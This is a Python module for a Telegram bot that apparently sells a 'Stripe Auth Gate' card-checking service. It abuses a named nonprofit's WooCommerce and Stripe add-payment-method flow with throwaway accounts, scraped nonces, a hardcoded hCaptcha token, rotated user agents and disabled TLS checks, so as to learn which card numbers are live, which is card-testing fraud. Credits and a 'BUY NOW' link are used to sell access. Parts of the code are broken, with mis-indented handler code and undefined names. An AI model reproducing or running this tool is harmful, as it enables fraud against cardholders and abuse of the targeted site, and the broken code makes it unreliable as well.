"""
Stripe Auth Gate (OSPL) - Full Code with hCaptcha
Command: /chk
Type: Auth (0$)
Mass: /mchk
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import re
import asyncio
import time
import requests
import random
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from bin import get_bin_info
from sub import get_premium_status

router = Router()
user_last_command_time = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SITE_URL = "https://www.ospl.org"
STRIPE_API = "https://api.stripe.com/v1"
M_STRIPE = "https://m.stripe.com/6"

CONNECTION_TIMEOUT = 30
READ_TIMEOUT = 45

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"

def luhn_check(card_number: str) -> bool:
    total = 0
    reverse_digits = card_number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def create_session_with_retry():
    session = requests.Session()
    session.verify = False
    retry_strategy = Retry(
        total=3,
        backoff_factor=2,
        status_forcelist=[408, 429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def random_delay(min_sec=1, max_sec=3):
    time.sleep(random.uniform(min_sec, max_sec))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN CHECKER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class OSPLChecker:
    def __init__(self):
        self.session = create_session_with_retry()
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random.choice(USER_AGENTS),
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        self.cookies = {}
        self.email = None
        self.register_nonce = None
        self.setup_nonce = None
        self.stripe_pk = None
        self.guid = None
        self.muid = None
        self.sid = None
        self.hcaptcha_token = None

    def _extract_hcaptcha_token(self, html):
        """Extract hCaptcha token from page HTML"""
        patterns = [
            r'hcaptcha_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-hcaptcha-token=["\']([^"\']+)["\']',
            r'name="hcaptcha-token"\s+value="([^"]+)"',
            r'P1_eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        ]
        for pat in patterns:
            match = re.search(pat, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _get_register_nonce(self):
        r = self.session.get(f'{SITE_URL}/my-account/', headers=self.headers, timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT))
        if r.status_code != 200:
            return False
        self.cookies.update(self.session.cookies.get_dict())
        
        # Extract hCaptcha token from page
        self.hcaptcha_token = self._extract_hcaptcha_token(r.text)
        
        match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text)
        if match:
            self.register_nonce = match.group(1)
            return True
        return False

    def _register_account(self):
        email = f"user{random.randint(100000,999999)}@gmail.com"
        self.email = email
        headers = self.headers.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['Referer'] = f'{SITE_URL}/my-account/'
        headers['Origin'] = SITE_URL
        data = {
            'email': email,
            'woocommerce-register-nonce': self.register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        r = self.session.post(f'{SITE_URL}/my-account/', headers=headers, data=data, timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT))
        self.cookies.update(self.session.cookies.get_dict())
        return r.status_code in [200, 302]

    def _get_payment_page_data(self):
        headers = self.headers.copy()
        headers['Referer'] = f'{SITE_URL}/my-account/payment-methods/'
        r = self.session.get(f'{SITE_URL}/my-account/add-payment-method/', headers=headers, timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT))
        if r.status_code != 200:
            return False
        self.cookies.update(self.session.cookies.get_dict())
        text = r.text

        pk_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', text)
        self.stripe_pk = pk_match.group(1) if pk_match else 'pk_live_51M80wRAXObJQb7r68WcFdu78mAB0UzvlQ5miI3HRm1xoiN7DPKZPGZI94hU4JhtMDKONXLvRYyYix3iVaigv4Xcq002CdqYE1U'

        match = re.search(r'"_ajax_nonce":"([^"]+)"', text)
        self.setup_nonce = match.group(1) if match else '406fb054a2'
        return True

    def _get_stripe_identifiers(self):
        try:
            r = self.session.post(M_STRIPE, data='', timeout=10)
            if r.status_code == 200:
                try:
                    detet = r.json()
                    self.guid = detet.get('guid')
                    self.muid = detet.get('muid')
                    self.sid = detet.get('sid')
                    return True
                except:
                    pass
        except:
            pass
        self.guid = '5690d74d-f78b-4a68-a642-e720444b9df073b744'
        self.muid = 'e8330a34-78c0-4ca8-a67d-c580f41f14985c706e'
        self.sid = 'c841a56a-699b-4288-ac2f-5b363a11b5640e897b'
        return True

    def _create_stripe_payment_method(self, card):
        parts = card.split('|')
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

        # If no hCaptcha token, use a default one
        if not self.hcaptcha_token:
            self.hcaptcha_token = "P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg4MjgwNDc5LCJjZGF0YSI6ImRxSHhjYm9UbXhxNFlXOEwzWkZLcnorSFUvL2NiTm5DU0lDZVA5U0lsWllsZm1iMEQ1VzZ2TGZ0UXZpbGUvRUVoSFVlQm1Qd1VyaEJ3ZVVTdW56c0RXUGZidjAzYVVvOTdKVTIrcnkzQXJ5dVJLWTJLTW1wOCtBZ2pBWE9zVUxUU0FwM3YrZ05ZNjZIWlJkSnJQeUFCcFV5UEFWKzdCMmt5bkZoelp0T1dUQmEvNnN6V083ZGxINHh5UnMyak9TZTNBemNYNzFxejczOTF6ODQ2TnJRdE51VVJNeUdJY05xcVNhK1lNSmVmMnlSQ0l1VUFYRWRvLzVJR0pMWlhaOUhWZE1iVEVrVkxwSDdQdDF3cTdjWmxlY3I4a0RhelhvM0dTaEFZL1pFNnFtODg1eTk5dmFhdUJsUnRiTHJRZ3lUMEtNU1YyR2JGTGFmc05VenJPS3N0cWJQdTlsN1RYdWp3SDlnWkZIVzMvUT1ZU2NqSFZzUFBFdEJlOG53IiwicGFzc2tleSI6IjM4SkgwL1lrdE1FVXRoMUEyYWxBV21PT3Y4WWNGOWtZeXpIazMyZzhtUUFUaUI3SzkrajJZUVhNVHZ4Z0d3aWJ2VStUZUJ0bUlTSEFha29BWUVXN1Y5YS9DS1IybXc3RkZkenQ1ZEU0RzVJOFVFZHFpS0hBNWpvTE1Jay90eGtkbnlKMFBreEpWWXl5Q1Q0V0R0aXQwbXk0TDhDb1I4VmpzeDJwZjZUVUZ2a2hzRFlDdjB4SDRad1gxbDFBTnJlNzZQT2VEL3FEbmdFaFQ4cnlHTmxGcExPaGN3Nm1CMWMyVFFiMGF5TFo1aGdqTURSbnB0eUVtS3d2QnQrSC9BaDhOVzA0c3dwR29uaEFrblZtNnN3VGMwcklPTHJ4M25WV1dJTUZGNGt1Z3U5MHlWVFpFcXdwVEJXTlZKZmlINGFpYkZmT0NaWXhscWk0VTBnZ1lLN2RJSDNaK1ZzeGRmaG16cWpFWC9nRWxJYm9aUVEwcHZCRW11d256ZUlDU1JBU0FMSjdzR3JvbTUxRmIwVFRRc2UrdFFOTjhXUld3QVhreDFPWGhseS8rYUJIb1ViemRXRDd6ZnNJL1IwM3I4YlJKN3piUUR0OFBuZ1VEMFQ3QjZTeUhPTEFxdWoyZjNMOERkbFBKWEJjS1ErK2xsSHlYZWVGVTJuSDBGSFNqUkNBWXVmSWVIUk9SaGxNUFhMbmZiVEd0V0I1Zkt3bFRoVTkxMUozelJXeG9LTi9jRzR0aFZXQ040VU5QV1NOQjdOb29EcXVzZVV5QzZhbEtCZ1dlNlh2YlR2bDNkeFdEVFpOZC9zdnNZSTNDYlBLeUJlQnB4T3ovcVJ4MUtYVWZzTTlhTnh2QWZhVkdBb1lZUU5VR0FhcUdWbVdOdFlrbFZsRGFNczRSWjVpYjExYzU4OUd3aXhvTXRqQnptMWowaExuVjVQZzlkMHQxT0FUeXNaMk9oNWtuck5TOGRMb3RUQTE0TzQ5RjdodlRoTTJVeHpkZE5FWVJVSWpIcGRCUFBJS0U2RmM1Yi9mdVZlbGc5c1lLOGQzb040dnZKemZ1STh0YlRoanFXNzNlMGZMM1I2RUg2QTE4S29kdkdIODB1US9lNWRrVTdWS25qU2JYTjNpd2pwdGJlN1R1SjU1MUlQVWEvNTQrdnE2NnpDMnQ4MkE0cFRvQ04rYW9DTjZ1UmhvUzF0Wm5TNEZvVnMxeG5iZkJTY2o3OUJPcDBORU1Hd2szS0xnSUdpT1NyRTVjZld3RTJZT3RUV0RUTXZybC8vMGhXd3VvUmNOcXdoNHRJc2VOZDBPZXJ5dlhYdmNxeWh6eDBRQ1NGNEFDWHE5d2dEQWEzU0JMb0JiLzlaUU9mRzUxR1lFYkYwdTZraHhINlRiSDN5MGNCTnhMbU8vZENTWEM4SmVTaHl5RzcwYWxNaFpjM1U5Y3NOd1BsaEtTZ3poN2hlTWozOUVwMkdQNlJLZFc2Q0xOMXR1SGYyM3FQMlNrNGp5SWZQejlIQnFTb1M1cGhXaG4ycDFWcCs1cjdYdDZtK0lhV3hUUnQ1S3JCd0QwaFRZNldLa3dsbGZmS1BKOWM3Mno4UEFwVkExQ0dpRS9yc3pvck01Y1cyaGVYM3lyeTdxNzJmVEZ1OUxmYW1NazRzcEtra1htZ1RlSmw5Tkl0Mk90UHZpRUxhQjVhLzJ3L3ZWMXpreHN1K21PODBiQjRoMTgzNEhSbWl0R2tUNmMzazdrNWw3NXNvSGNNVjFkMG5hSmY0TG4vMWxwaG05TzZnVUhFa215cEZET1ZHQXN4Mkk4aHQ3dXYyVUFkWWluazFCeWttMC9zZ3lNZnE4NFBjbGcrdFRNbGZJVXFOZXYwWEI2NW5nQXYxMUt0SWlvSTZuZHBuYUhmYUNlNWZ6TjdaaEREbnIva21WU2loTzkyVE4vWXFMOEpXWjgzeFVhSnEzT0xIV0VESmJkaEcwVjJmR0RpZlduZmthVlgzU0srbmRRWWdzOU92MkVMa2x3YlhBY1lNSlRBelZ1UUNCUDFXdG9Gak9tSXZXZ2FBM0dOY0xGU0h4bG5SRzBHN0x3blpncTZpU2pSM1hUUFA1RmhNMUtkUjUzcVg2Nm5iOG9FdnM1bmRjblIybCs3TVBlYW9nNFVRelpCdngxSlgwdVFPMW93VUhSVENySHJ1aVFuSFFQNkdsZzllNHFkWEt6dXRqZG1KT2tXb2NmT1VzQ3JwZ3hNR1lxSWpXcjZJVGE1bTQxR3ZUcGE3bDhhL2hjY0RzTU5NZVVVNmRzVFllVkxVSldXYmFSSVhkdzNhRlhsdXF5ai9WWWc5T2NGcVNzTzBha0poTTFQUktJTTh6dnF6QlR1bVB5TmpVWHBOa2lRQmJBUXNDSWJUVkYraVhZSEQwTnBTakpTYVZGYWtvaC9xU1lLOXJsL3pINDk5MS9KVHY1d0JkWkdwR3BRS1ZMUi93NmlYcEVTTHVFQitqR0x4ZVBVVGVjVEZMNkdGUStqakVIZkZkNUZya21WbVR1R3prcERrcE1OM0wyT1JZMDhPaStQYzhRYjBNNVdjVFdueThtUk1INDRUNGdjWWJyVUt5VXJzU2wwRUx0UHcxNEI0Ri9xZUNtcnVsVEk4bk41aEpXRFBQNlRRUFN6Zk05ZTNHZThQU2t5MW5RK21tTzNHeko4RWFzVWZFV3hGV2s2dGx2cThCdHJ5VS81OUJlS1ZRV0lFN1ovdmM2b1lnUlowa0pFck1FQzVuTE9jaUFSS01Udz09Iiwia3IiOiI0YjJmOWNkMiIsInNoYXJkX2lkIjozMzk1MTAzMDN9.xMBU-68nzKAz51kLWQap0WpFwIDp-1OpKQdJJyTK5uQ"

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': self.headers.get('user-agent', 'Mozilla/5.0'),
        }

        data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10001',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/faa58182a6; stripe-js-v3/faa58182a6; payment-element; deferred-intent',
            'referrer': 'https://www.ospl.org',
            'time_on_page': str(random.randint(10000, 99999)),
            'guid': self.guid,
            'muid': self.muid,
            'sid': self.sid,
            'key': self.stripe_pk,
            '_stripe_version': '2025-09-30.clover',
            'radar_options[hcaptcha_token]': self.hcaptcha_token,
        }

        return self.session.post(f'{STRIPE_API}/payment_methods', headers=headers, data=data, timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT))

    def _send_setup_intent(self, pm_id):
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': SITE_URL,
            'Referer': f'{SITE_URL}/my-account/add-payment-method/',
            'User-Agent': self.headers.get('user-agent', 'Mozilla/5.0'),
            'X-Requested-With': 'XMLHttpRequest',
        }
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': self.setup_nonce,
        }
        return self.session.post(f'{SITE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=(CONNECTION_TIMEOUT, READ_TIMEOUT))

    def check_card(self, card_string):
        start_time = time.time()
        formatted = self.format_card(card_string)
        if not formatted:
            return {'card': card_string, 'status': 'ERROR', 'message': 'Invalid format', 'time': 0}

        for attempt in range(2):
            if attempt > 0:
                self.session = create_session_with_retry()
                self.cookies = {}

            if not self._get_register_nonce():
                continue
            random_delay(1, 2)

            if not self._register_account():
                continue
            random_delay(1, 2)

            if not self._get_payment_page_data():
                continue
            random_delay(1, 2)

            if not self._get_stripe_identifiers():
                continue
            random_delay(1, 2)

            r_pm = self._create_stripe_payment_method(formatted)
            if r_pm is None:
                return {'card': formatted, 'status': 'ERROR', 'message': 'Missing hCaptcha token', 'time': time.time()-start_time}

            if r_pm.status_code != 200:
                try:
                    err = r_pm.json()
                    msg = err.get('error', {}).get('message', 'Stripe error')
                    status = 'DECLINED' if any(k in msg.lower() for k in ['declined', 'insufficient', 'cvv', 'invalid', 'expired']) else 'ERROR'
                    return {'card': formatted, 'status': status, 'message': msg[:200], 'time': time.time()-start_time}
                except:
                    return {'card': formatted, 'status': 'ERROR', 'message': f'Stripe HTTP {r_pm.status_code}', 'time': time.time()-start_time}

            try:
                pm_resp = r_pm.json()
                pm_id = pm_resp.get('id')
                if not pm_id:
                    return {'card': formatted, 'status': 'ERROR', 'message': 'No PM ID', 'time': time.time()-start_time}
            except:
                return {'card': formatted, 'status': 'ERROR', 'message': 'Invalid Stripe JSON', 'time': time.time()-start_time}

            r_setup = self._send_setup_intent(pm_id)
            elapsed = time.time() - start_time

            try:
                resp_json = r_setup.json()
                if resp_json.get('success') is True:
                    return {'card': formatted, 'status': 'APPROVED', 'message': 'Payment method added ✅', 'time': elapsed}

                data = resp_json.get('data', {})
                if isinstance(data, dict):
                    err = data.get('error', {})
                    if err.get('message'):
                        msg = err['message']
                        status = 'DECLINED' if any(k in msg.lower() for k in ['declined', 'insufficient', 'cvv', 'invalid', 'expired']) else 'ERROR'
                        return {'card': formatted, 'status': status, 'message': msg[:200], 'time': elapsed}

                msg = resp_json.get('message', 'Unknown')
                return {'card': formatted, 'status': 'DECLINED', 'message': msg[:200], 'time': elapsed}

            except Exception as e:
                txt = r_setup.text.lower()
                if 'declined' in txt or 'insufficient' in txt:
                    return {'card': formatted, 'status': 'DECLINED', 'message': 'Card declined ❌', 'time': elapsed}
                return {'card': formatted, 'status': 'ERROR', 'message': str(e)[:100], 'time': elapsed}

        return {'card': formatted, 'status': 'ERROR', 'message': 'Max retries', 'time': time.time()-start_time}

    def format_card(self, card_string):
        card_string = card_string.strip()
        parts = re.split(r'[/|\-_\s]+', card_string)
        if len(parts) != 4:
            return None
        number = re.sub(r'\D', '', parts[0])
        month = parts[1].zfill(2)
        year = parts[2]
        cvv = parts[3]
        if len(year) == 4:
            year = year[2:]
        if not luhn_check(number):
            return None
        return f"{number}|{month}|{year}|{cvv}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("chk"))
async def chk_command(message: types.Message):
        await message.reply("🚧 <b>𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    if not is_premium:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"⚠️ <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    parts = message.text.split(maxsplit=1)
    raw_text = ""
    if len(parts) > 1:
        raw_text = parts[1].strip()
    elif message.reply_to_message:
        raw_text = message.reply_to_message.text or message.reply_to_message.caption

    if not raw_text:
        await message.reply(
            "❌ <b>Usage:</b> /chk <code>cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)

    if not match:
        await message.reply(
            "❌ <b>Invalid Card Format.</b>\n"
            "Use: <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    if not luhn_check(cc):
        await message.reply("❌ <b>Invalid Card</b>", parse_mode="HTML")
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await message.reply("❌ <b>Insufficient Credits!</b>", parse_mode="HTML")
        return

    plan_name = await get_user_plan_name(user_id)
    proc_msg = await message.reply("<pre>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴…⏳</pre>", parse_mode="HTML")

    asyncio.create_task(
        process_chk_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name)
    )

async def process_chk_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name):
    checker = OSPLChecker()
    result = checker.check_card(formatted_cc)

    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    status_raw = result.get("status", "").upper()
    res_message = result.get("message", "N/A")
    is_charged = False

    if status_raw == "APPROVED":
        final_status = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        is_charged = True
    elif status_raw == "CHARGED":
        final_status = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅"
        is_charged = True
    elif status_raw == "DECLINED":
        final_status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
    else:
        final_status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"

    credits_to_deduct = 0
    if is_charged:
        credits_to_deduct = 2
    elif status_raw == 'DECLINED':
        credits_to_deduct = 1

    if credits_to_deduct > 0:
        current_balance = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = current_balance - credits_to_deduct
        if new_balance < 0:
            new_balance = 0
        await asyncio.to_thread(update_credits, user_id, new_balance)


    user_link = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
    dev_link = '<a href="https://t.me/npnbit4">npnbit4</a>'
    user_display = f"{user_link} <b>({plan_name})</b>"

    final_caption = (
        f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {final_status}\n"
        f"𝗖𝗮𝗿𝗱 ➛ <code>{formatted_cc}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{res_message}</b>\n"
        f"𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"𝗗𝗲𝘃 ➛ {dev_link}"
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

    try:
        await proc_msg.edit_text(text=final_caption, parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        await message.reply(text=final_caption, parse_mode="HTML", reply_markup=reply_markup)
